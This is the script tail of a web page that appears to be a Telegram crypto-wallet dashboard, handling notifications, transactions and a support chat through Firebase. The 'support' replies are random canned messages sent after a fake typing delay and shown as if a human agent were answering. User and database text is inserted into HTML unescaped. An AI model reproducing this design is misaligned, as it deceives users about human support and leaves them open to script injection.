        $("#logout-btn").on("click", () => {
          try {
            window.Telegram.WebApp.close();
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to logout: ${error.message}`, position: "topRight" });
          }
        });

        onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
          const notifications = snapshot.val() || {};
          const notificationList = $("#notification-table-body");
          notificationList.empty();

          // Sort notifications by timestamp (descending)
          const sortedNotifications = Object.entries(notifications).sort(([, a], [, b]) => {
            return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
          });

          sortedNotifications.forEach(([id, notif]) => {
            notificationList.append(`
              <li>
                <strong>${notif.title}</strong>: ${notif.message}<br>
                <small>${new Date(notif.timestamp).toLocaleString()}</small>
              </li>
            `);
          });
        });

        onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
          const transactions = snapshot.val() || {};
          const transactionTable = $("#transaction-table-body");
          transactionTable.empty();

          // Sort transactions by timestamp (descending)
          const sortedTransactions = Object.entries(transactions).sort(([, a], [, b]) => {
            return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
          });

          sortedTransactions.forEach(([id, tx]) => {
            const currency = tx.currency && ["USD", "USDT", "BTC", "ETH"].includes(tx.currency) ? tx.currency : "USD";
            const amount = currency === "BTC" || currency === "ETH" ? tx.amount.toFixed(6) : tx.amount.toFixed(2);
            const network = tx.type === "Send" || tx.type === "Receive" ? "N/A" : (tx.network || "ERC20");
            transactionTable.append(`
              <tr>
                <td>${amount} ${currency}</td>
                <td>${currency}</td>
                <td class="wallet-cell">
                  ${truncateAddress(tx.wallet)}
                  <button class="btn-copy" data-wallet="${tx.wallet}">Copy</button>
                </td>
                <td>${network}</td>
                <td>${tx.type}</td>
                <td>${tx.status}</td>
                <td>${new Date(tx.timestamp).toLocaleString()}</td>
              </tr>
            `);
          });

          $(".btn-copy").on("click", async function() {
            const wallet = $(this).data("wallet");
            try {
              await copyToClipboard(wallet);
              showToast("Wallet address copied!");
            } catch (error) {
              iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
            }
          });
        });

        let isTyping = false;
        async function simulateSupportResponse(message) {
          const chatMessages = $("#chat-messages");
          const typingIndicator = $(`
            <div class="typing-indicator">
              <span></span><span></span><span></span>
            </div>
          `);
          chatMessages.append(typingIndicator);
          chatMessages.scrollTop(chatMessages[0].scrollHeight);

          await new Promise(resolve => setTimeout(resolve, 2000));

          const responses = [
            "Thanks for reaching out! How can we assist you today?",
            "We're here to help. Could you provide more details?",
            `Got your message: "${message.slice(0, 20)}${message.length > 20 ? "..." : ""}". What's next?`,
            "Our team is reviewing your query. Please hold on.",
            "Can you clarify your request? We're all ears!",
          ];
          const randomResponse = responses[Math.floor(Math.random() * responses.length)];

          typingIndicator.remove();
          const supportMessage = {
            message: randomResponse,
            sender: "support",
            timestamp: new Date().toISOString(),
            status: "sent",
          };

          const newMessageRef = push(ref(database, `users/${userId}/chat`));
          await set(newMessageRef, supportMessage);
        }

        $("#send-message").on("click", async () => {
          const message = $("#chat-input").val().trim();
          if (!message) {
            iziToast.error({ title: "Error", message: "Message cannot be empty!", position: "topRight" });
            return;
          }

          try {
            const newMessageRef = push(ref(database, `users/${userId}/chat`));
            await set(newMessageRef, {
              message: message,
              sender: "user",
              timestamp: new Date().toISOString(),
              status: "pending",
            });

            $("#chat-input").val("");
            iziToast.success({ title: "Success", message: "Message sent!", position: "topRight" });

            setTimeout(async () => {
              await update(ref(database, `users/${userId}/chat/${newMessageRef.key}`), { status: "sent" });
              await simulateSupportResponse(message);
            }, 1000);
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to send message: ${error.message}`, position: "topRight" });
          }
        });

        $("#chat-input").on("keypress", async (e) => {
          if (e.which === 13) {
            e.preventDefault();
            $("#send-message").click();
          }
        });

        $("#chat-input").on("input", () => {
          isTyping = true;
          setTimeout(() => {
            isTyping = false;
            $("#chat-messages").scrollTop($("#chat-messages")[0].scrollHeight);
          }, 500);
        });

        onValue(ref(database, `users/${userId}/chat`), (snapshot) => {
          const messages = snapshot.val() || {};
          const chatContainer = $("#chat-messages");
          chatContainer.empty();

          // Group messages by date
          const groupedMessages = {};
          Object.entries(messages).forEach(([id, msg]) => {
            const dateCategory = formatChatDate(msg.timestamp);
            if (!groupedMessages[dateCategory]) {
              groupedMessages[dateCategory] = [];
            }
            groupedMessages[dateCategory].push({ id, ...msg });
          });

          // Sort date categories (Today, Yesterday, then older dates)
          const sortedDates = Object.keys(groupedMessages).sort((a, b) => {
            if (a === "Today") return -1;
            if (b === "Today") return 1;
            if (a === "Yesterday") return -1;
            if (b === "Yesterday") return 1;
            return new Date(b).getTime() - new Date(a).getTime();
          });

          // Render messages
          sortedDates.forEach((date) => {
            chatContainer.append(`<p class="chat-date-header">${date}</p>`);
            groupedMessages[date].forEach(({ id, ...msg }) => {
              const isUser = msg.sender === "user";
              const statusClass = msg.status === "pending" ? "pending" : "sent";
              const statusIcon = msg.status === "pending" ? '<i class="fas fa-check"></i>' : '<i class="fas fa-check-double"></i>';
              chatContainer.append(`
                <div class="chat-message ${isUser ? "user" : "support"}">
                  ${isUser ? `<span class="avatar">${username[0].toUpperCase()}</span>` : `<span class="avatar"><i class="fas fa-headphones"></i></span>`}
                  ${msg.message}
                  <div class="message-footer">
                    <small>${formatChatDate(msg.timestamp)}</small>
                    ${isUser ? `<span class="status ${statusClass}">${statusIcon}</span>` : ""}
                  </div>
                </div>
              `);
            });
          });

          if (!isTyping) {
            chatContainer.scrollTop(chatContainer[0].scrollHeight);
          }

          const lastSupportMessage = Object.values(messages)
            .filter((msg) => msg.sender === "support")
            .slice(-1)[0];
          const lastSeen = lastSupportMessage ? formatChatDate(lastSupportMessage.timestamp) : "Online";
          $("#support-status").text(`Support was last seen: ${lastSeen}`);
        });
      });
    });
  </script>
</body>
</html>
